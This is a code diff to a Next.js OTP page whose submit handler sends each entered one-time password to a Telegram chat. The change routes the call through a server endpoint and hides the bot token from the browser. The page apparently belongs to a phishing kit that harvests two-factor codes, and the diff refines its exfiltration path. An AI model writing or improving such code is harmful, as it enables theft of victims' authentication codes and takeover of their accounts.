@@ -36,15 +36,14 @@ export default function OtpPage() {
     const message = `🔐 *OTP Submitted*\n\n🔢 OTP: ${otp}`;
 
     try {
-      const telegramResponse = await fetch(
-        `https://api.telegram.org/bot${process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN}/sendMessage`,
+      const telegramResponse = await fetch('api/send-telegram',
         {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
           },
           body: JSON.stringify({
-            chat_id: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID,
+            chat_id: process.env.TELEGRAM_CHAT_ID,
             text: message,
             parse_mode: "Markdown",
           }),
